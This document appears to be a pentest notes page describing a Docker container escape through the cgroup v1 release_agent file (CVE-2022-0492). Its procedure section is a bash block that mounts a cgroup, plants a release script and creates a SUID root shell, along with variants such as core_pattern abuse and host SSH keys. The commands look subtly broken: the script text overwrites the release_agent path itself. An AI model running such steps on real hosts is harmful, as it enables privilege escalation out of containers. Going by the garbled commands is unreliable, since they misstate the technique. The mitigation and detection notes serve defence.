---
topic: Container escape through release_agent
tags: [linux, docker, cgroup, container-escape, privesc]
---

# Container escape through release_agent

[🌐 Español](cgroup-release-agent-escape.md) | **English**

## Concept

In cgroup v1, the `release_agent` file runs a host program when a cgroup becomes empty. If a container has `CAP_SYS_ADMIN` and the cgroup is mounted writable, it can register its own agent and escape. CVE-2022-0492 widens this surface on kernels missing the capability check.

## When it applies

- `capsh --print` shows `cap_sys_admin`.
- `mount` shows a read-write cgroup v1.
- The kernel predates the CVE-2022-0492 fix.

## Procedure

1. Check the capability and cgroup mount.
2. Create a child cgroup and a script that copies `/bin/bash` with SUID.
3. Write the path into `release_agent` and empty the cgroup.
4. Run the binary from the mounted host or the container.

```bash
capsh --print | grep sys_admin
mount | grep cgroup
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
echo "/tmp/cgrp/release_agent" > /tmp/cgrp/release_agent
printf '#!/bin/sh\ncp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash\n' > /tmp/cgrp/release_agent
chmod +x /tmp/cgrp/release_agent
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
/tmp/rootbash -p
```

## Variants

- Use `core_pattern` when `release_agent` is not writable.
- Mount the host filesystem and modify a privileged binary.
- Combine with a host SSH key.

## Limitations

- cgroup v2 has no `release_agent`.
- Without `CAP_SYS_ADMIN` the mount fails.
- A patched kernel blocks the write.

## Mitigation and detection

- Run containers without `CAP_SYS_ADMIN`.
- Use cgroup v2 and user namespaces.
- Update the kernel and monitor cgroup mounts.

## References

- <https://nvd.nist.gov/vuln/detail/CVE-2022-0492>
- <https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/>
- <https://attack.mitre.org/techniques/T1611/>
